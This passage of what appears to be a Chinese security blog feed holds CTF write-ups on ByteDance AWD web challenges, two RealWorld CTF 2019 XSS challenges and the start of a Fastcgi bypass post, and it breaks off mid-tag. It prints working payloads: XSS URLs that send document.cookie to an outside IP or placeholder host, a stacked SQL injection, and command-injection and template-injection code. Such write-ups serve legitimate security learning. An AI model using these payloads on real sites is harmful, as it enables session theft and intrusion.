    <published>2019-10-19T16:00:00.000Z</published>
    <updated>2019-10-22T07:34:43.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="字节跳动CTF线下赛Web题解-amp-复盘"><a href="#字节跳动CTF线下赛Web题解-amp-复盘" class="headerlink" title="字节跳动CTF线下赛Web题解&amp;复盘"></a>字节跳动CTF线下赛Web题解&amp;复盘</h1><h1 id="PythonWeb"><a href="#PythonWeb" class="headerlink" title="PythonWeb"></a>PythonWeb</h1><h2 id="做题小谈"><a href="#做题小谈" class="headerlink" title="做题小谈"></a>做题小谈</h2><p>之前线下赛没运维过pythonweb，踩了很多坑，小记一下。</p><p>flask在更改代码后要重启才能生效，但是如果<code>app.DEBUG=True</code>则不需要重启flask，这个配置多见于<code>config.py</code>，比赛的时候也可以全局搜索。</p><p>目录结构如下<br><img src="http://static.zybuluo.com/1160307775/44a650nlxazo4hlxfio2jpd6/image_1dnm2lc67dmv18gg4fn1d95fq5m.png" alt="image_1dnm2lc67dmv18gg4fn1d95fq5m.png-112.2kB"></p><p>在pyweb的awd中，<strong>一定要先<code>ps -ef</code>看一下系统的进程，看看原始的服务是怎么启动的，我们就可以照着它的命令去重启flask</strong>，而不至于把服务启崩。这次我就是没有看进程，自己相当然的用命令<code>flask run</code>，结果被down了好几轮。</p><p>最后看了下手册，这里pyweb使用gunicorn来启动的：</p><pre><code>gunicorn -b 0.0.0.0:5000  manage:app</code></pre><h2 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code>@main.route(&#39;/file&#39;)def file():    file = request.args.get(&#39;file&#39;,base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg&#39;))    f = open(base64.b64decode(file),&#39;rb&#39;)    res = f.read()    return jsonify({&quot;res&quot;:res})</code></pre><p>request.args.get()获取file参数，如果参数不存在则为<code>base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg)</code></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>后台有一点路由<code>/backup</code>，可以调用popen()，那就可以先注册用户，再去rce。同时这个点应该也可以读取任意文件</p><pre><code>@main.route(&#39;/backup&#39;,methods = [&#39;GET&#39;])@login_requireddef backup():    if request.args.get(&#39;name&#39;):        shell = &#39;tar -zcf ./&#39;+ request.args.get(&#39;name&#39;) +&#39;.tar.gz ./&#39;        res = os.popen(shell).read()        ress = {&quot;res&quot;:res}        return jsonify(ress)    else:        return &quot;param is name! please backup!&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/xkcvhk7x2py4e8psnoftecq0/image_1dnm8r3b65901pom16tg12t1c031g.png" alt="image_1dnm8r3b65901pom16tg12t1c031g.png-34.8kB"></p><h3 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h3><p>这个点我没挖到，但是后来听别的师傅说存在404的ssti</p><pre><code>@main.app_errorhandler(404)def page_not_found(e):    for x in request.path:        if x in &#39;._%&#39;:            return render_template(&#39;404.html&#39;), 404    template = &#39;&#39;&#39;{%% block body %%}    &lt;div class=&quot;center-content error&quot;&gt;        &lt;h1&gt;Oops! That page doesn&#39;t exist in this Blog.&lt;/h1&gt;        &lt;h3&gt;%s&lt;/h3&gt;    &lt;/div&gt;{%% endblock %%}&#39;&#39;&#39; % (request.url)    return render_template_string(template), 404</code></pre><p>过滤了<code>._%</code>，下面的ssti是经典的漏洞案例。利用<code>|</code>过滤器和动态传参就可以bypass了，跟今年护网杯的题目思路差不多，这里盗用一下@Smile师傅的payload</p><p><img src="http://static.zybuluo.com/1160307775/0ag6778ky7rmn2p6hbxeolyy/image_1dnp66nft9tm243119nifpt49.png" alt="image_1dnp66nft9tm243119nifpt49.png-91.2kB"></p><h2 id="流量记录"><a href="#流量记录" class="headerlink" title="流量记录"></a>流量记录</h2><p>这次还是吃了没流量的亏，测试了一下别人的py流量脚本，这里贴出来</p><pre><code>@main.before_requestdef awdlog():    import time    f = open(&#39;/tmp/pylog.txt&#39;,&#39;a+&#39;)    f.writelines(time.strftime(&#39;%Y-%m-%d %H:%M:%S\n&#39;, time.localtime(time.time())))    f.writelines(&quot;{method} {url} \n&quot;.format(method=request.method,url=request.url))    s = &#39;&#39;    for d,v in dict(request.headers).items():        s += &quot;%s: %s\n&quot;%(d,v)    f.writelines(s+&#39;\n&#39;)    s = &#39;&#39;    for d,v in dict(request.form).items():        s += &quot;%s=%s&amp;&quot;%(d,v)    f.writelines(s.strip(&quot;&amp;&quot;))    f.writelines(&#39;\n\n&#39;)    f.close()</code></pre><p><strong>main</strong>指的是应用名，每次根据实际情况更改，最终在/tmp下生成日志<br><img src="http://static.zybuluo.com/1160307775/4ly8u0z2pqen24kyzhml5qt1/image_1dnn61c77p61mvu1v011ini1qtt7e.png" alt="image_1dnn61c77p61mvu1v011ini1qtt7e.png-533.4kB"></p><h1 id="Opensns"><a href="#Opensns" class="headerlink" title="Opensns"></a>Opensns</h1><p>基于TP3.2.2开发，比赛复现出两个漏洞。其中一个是内置后门就不说了，还有一个是渲染模版时的任意文件读取漏洞</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="任意文件读取-1"><a href="#任意文件读取-1" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>keywords[_filename]=/flag</code></p><p>漏洞点在<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>的File类驱动中，同时File类继承自Storage类：<code>class File extends Storage</code></p><p><img src="http://static.zybuluo.com/1160307775/19r0bw8jrs4a14a8r9emc8c6/image_1dnmqjgof1rfhksv1ae71engq2320.png" alt="image_1dnmqjgof1rfhksv1ae71engq2320.png-396.7kB"></p><p>在判断了$vars是否存在后，进行了一次变量覆盖，再调用load方法进行了文件包含。追踪一下哪里调用了load方法，发现都是在解析模版的时候调用的，这里选择文件<code>ThinkPHP/ThinkPHP/Library/Think/Template.class.php</code>的fetch()方法</p><p><img src="http://static.zybuluo.com/1160307775/qoihow4a22x8pzdf9i9eoxiv/image_1dnmrrf2k138168g9gm12sfoip2t.png" alt="image_1dnmrrf2k138168g9gm12sfoip2t.png-245.5kB"></p><p>发现可控参数<code>$templateVar</code>，会被当作实参传入load()，继续寻找调用fetch()方法的位置。因为TP代码中有很多实例化的方法，并不都像<code>storage::</code>这样的调用方式，只能全局搜索fetch看哪里调用。最终发现在<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>中实例化了Template类并且调用fetch()方法。</p><p><img src="http://static.zybuluo.com/1160307775/fmsgcdfr846jsn5g71sardnt/image_1dnms90lf1fbckc91cnr18281g1c3a.png" alt="image_1dnms90lf1fbckc91cnr18281g1c3a.png-505.2kB"></p><p>刚才说到可控参数<code>$templateVar</code>的原型在这里为<code>$_data</code>，那么<code>$_data</code>是否可控？继续追调用链，在这里追的时候就卡壳了，因为涉及到tp的一个知识：<a href="https://blog.csdn.net/u013927110/article/details/47000379" target="_blank" rel="noopener">Thinkphp下利用钩子使用行为扩展</a></p><p>简单来说就在xx文件中，先宏定义了监听器对应的类名再加载进程序(这里的类指的是类似于ParseTemplateBehavior.class.php这种的行为拓展类)<br><img src="http://static.zybuluo.com/1160307775/ab7rmh3hiapj8i4ns6dqrwvi/image_1dnmt4sfa1c6ja0pgb4v00mft4q.png" alt="image_1dnmt4sfa1c6ja0pgb4v00mft4q.png-50.2kB"></p><p>而后，程序中的Hook机制通过触发不同类型的监听器，实现对应行为拓展类的实例化且会调用对应行为拓展类的run方法。一个简单的触发机制就是<code>Hook::Listen(tags,prarm)</code>。</p><p>那么在这里我们希望它触发<code>view_parse</code>，从而实例化<code>ParseTemplateBehavior</code>。就全局搜索<code>Hook::listen(&#39;view_parse&#39;</code>。在TP的视图类里找到了该监听器的hook<br><img src="http://static.zybuluo.com/1160307775/d7u78w1qao6dkos6xtce62gw/image_1dnmtdrpd6t6101m1omechn1n0857.png" alt="image_1dnmtdrpd6t6101m1omechn1n0857.png-507.6kB"></p><p>接下来就好说了，只要<code>$parama</code>可控，并且找到一处能够调用fetch函数的地方，整条利用链就完整了。</p><p>其中$param的取值经过一系列的操作</p><pre><code>public function assign($name, $value = &#39;&#39;){    if (is_array($name)) {        $this-&gt;tVar = array_merge($this-&gt;tVar, $name);    } else {        $this-&gt;tVar[$name] = $value;    }}$params = array(&#39;var&#39; =&gt; $this-&gt;tVar, &#39;file&#39; =&gt; $templateFile, &#39;content&#39; =&gt; $content, &#39;prefix&#39; =&gt; $prefix);</code></pre><p>file、content、prefix为定值，只有<code>$this-&gt;tvar</code>可操作且被assign函数赋值。这里存在以前tp3的模版rce漏洞的挖掘链，通过assign这个模版赋值函数，赋值变量<code>$this-&gt;tvar</code>。</p><p>同时这里还涉及Tp的一个小操作：在tp3.2中，对模版的加载&amp;渲染依靠<code>ThinkPHP/ThinkPHP/Library/Think/View.class.php</code>。先通过View类方法<code>assgin()</code>对模版赋值，再调用<code>display()</code>加载模板和页面输出。在display函数的内部同时实现了<code>fetch()</code>函数解析并获取模板内容，也解决了上面调用fetch函数的困扰。</p><p>所以只需要找一个Controller，接受post/get传入参数，并且能够传入<code>assign()</code>去模版赋值，之后再经过tp的<code>display()</code>函数渲染模版，这里出题人在控制器里造了一个方法search，接受keywords参数</p><pre><code>public function search(){    $keywords=I(&#39;post.keywords&#39;,&#39;&#39;,&#39;text&#39;);    $modules = D(&#39;Common/Module&#39;)-&gt;getAll();    foreach ($modules as $m) {        if ($m[&#39;is_setup&#39;] == 1 &amp;&amp; $m[&#39;entry&#39;] != &#39;&#39;) {            if (file_exists(APP_PATH . $m[&#39;name&#39;] . &#39;/Widget/SearchWidget.class.php&#39;)) {                $mod[] = $m[&#39;name&#39;];            }        }    }    $show_search = get_kanban_config(&#39;SEARCH&#39;, &#39;enable&#39;, $mod, &#39;Home&#39;);    $this-&gt;assign($keywords);    $this-&gt;assign(&#39;showBlocks&#39;, $show_search);    $this-&gt;display();}</code></pre><p>构造如下poc本地包含文件，由于开启了ob_start()。<br><img src="http://static.zybuluo.com/1160307775/rxlpeekkh3xij9ql2ltkfr7m/image_1dnn1fspe10st1i4rbe6nt1p6g5k.png" alt="image_1dnn1fspe10st1i4rbe6nt1p6g5k.png-208.2kB"></p><p>总结来说，该点漏洞就是加载模版的时候，把本地文件作为模版变量赋值，再渲染到页面。这个在平常的代码审计中也是一个不错的思路，膜出题人。</p><h1 id="douchat"><a href="#douchat" class="headerlink" title="douchat"></a>douchat</h1><p>同样使用TP3.2.2开发的</p><h2 id="漏洞浮现"><a href="#漏洞浮现" class="headerlink" title="漏洞浮现"></a>漏洞浮现</h2><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>跟opensns类似的漏洞，也是模版的渲染，只不过这次存在content参数，即生成的缓存有效时，加载缓存造成代码注入。由于开启了ob_start()，因此在include的时候代码注入<br><img src="http://static.zybuluo.com/1160307775/rqxm9hrlwxtkdfxn6xznrey2/image_1dnn52qdims3v3217dm1s6ph8f6h.png" alt="image_1dnn52qdims3v3217dm1s6ph8f6h.png-535.2kB"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>漏洞文件：/Public/Plugins/webuploader/server/preview.php</p><pre><code>$src = file_get_contents(&#39;php://input&#39;);if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) {    $previewUrl = sprintf(        &quot;%s://%s%s&quot;,        isset($_SERVER[&#39;HTTPS&#39;]) &amp;&amp; $_SERVER[&#39;HTTPS&#39;] != &#39;off&#39; ? &#39;https&#39; : &#39;http&#39;,        $_SERVER[&#39;HTTP_HOST&#39;],        $_SERVER[&#39;REQUEST_URI&#39;]    );    $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);    $base64 = $matches[2];    $type = $matches[1];    if ($type === &#39;jpeg&#39;) {        $type = &#39;jpg&#39;;    }    $filename = md5($base64).&quot;.$type&quot;;    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;    if (file_exists($filePath)) {        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);    } else {        $data = base64_decode($base64);        file_put_contents($filePath, $data);        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);    }} else {    die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : {&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;}}&#39;);}</code></pre><p><code>$src</code>可控，通过伪协议控制生成的文件名，然后写入到preview/下并回显出来</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;字节跳动CTF线下赛Web题解-amp-复盘&quot;&gt;&lt;a href=&quot;#字节跳动CTF线下赛Web题解-amp-复盘&quot; class=&quot;headerlink&quot; title=&quot;字节跳动CTF线下赛Web题解&amp;amp;复盘&quot;&gt;&lt;/a&gt;字节跳动CTF线下赛Web题解&amp;amp;
      
    
    </summary>
    
    
      <category term="AWD" scheme="https://hpdoger.cn/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>RealWorld CTF2019 两道XSS-Web题解</title>
    <link href="https://hpdoger.cn/2019/09/24/RealWorld%20CTF2019%20%E4%B8%A4%E9%81%93XSS-Web%E9%A2%98%E8%A7%A3/"/>
    <id>https://hpdoger.cn/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/</id>
    <published>2019-09-23T16:00:00.000Z</published>
    <updated>2019-10-09T14:23:26.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p><h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p><pre><code>&lt;script&gt;    var getUrlParam = function (name) {        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);        var r = unescape(window.location.search.substr(1)).match(reg);        if (r != null) return r[2];        return null;    }    function setCookie(name, value) {        var Days = 30;        var exp = new Date();        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();    }    function getCookie(name) {        var search = name + &quot;=&quot;        var offset = document.cookie.indexOf(search)        if (offset != -1) {            offset += search.length;            var end = document.cookie.indexOf(&quot;;&quot;, offset);            if (end == -1) {                end = document.cookie.length;            }            return unescape(document.cookie.substring(offset, end));        }        else return &quot;&quot;;    }    function setElement(tag) {        tag = tag.substring(0, 1);        var ele = document.createElement(tag)        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);        for (var i = 0; i &lt; attrs.length; i++) {            var key = attrs[i].split(&quot;=&quot;)[0];            var value = attrs[i].split(&quot;=&quot;)[1];            ele.setAttribute(key, value);        }        document.body.appendChild(ele);    }    var tag = getUrlParam(&quot;tag&quot;);    setCookie(&quot;tag&quot;, tag);    setElement(tag);&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p><pre><code>var tag = getUrlParam(&quot;tag&quot;);setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p><p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p><p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p><p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p><pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p><p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p><pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p><pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p><p>接着就是常规打cookie到本地</p><pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p><p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p><p>于此同时题目有两个难点需要bypass：</p><ul><li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li></ul><ul><li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li></ul><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p><p>于此同时Bypass auditor也算是出题人给我们的Hint。</p><p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p><p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p><p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p><pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p><pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p><p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p><p>此时我们来尝试一下能否Bypass XSS Auditor</p><pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p><p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p><p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p><pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p><p>接着就是把flag打到自己的本地就行了</p><pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RealWorld-CTF2019-两道XSS-Web题解&quot;&gt;&lt;a href=&quot;#RealWorld-CTF2019-两道XSS-Web题解&quot; class=&quot;headerlink&quot; title=&quot;RealWorld CTF2019 两道XSS-Web题解&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>从一道CTF学习Fastcgi绕过姿势</title>
    <link href="https://hpdoger.cn/2019/09/17/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E5%AD%A6%E4%B9%A0Fastcgi%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
    <id>https://hpdoger.cn/2019/09/17/从一道CTF学习Fastcgi绕过姿势/</id>
    <published>2019-09-16T16:00:00.000Z</published>
    <updated>2019-10-09T14:24:36.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p><p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p><p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p><p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p><p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p><p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p><p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p><p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p><p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p><pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227=&gt;UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" 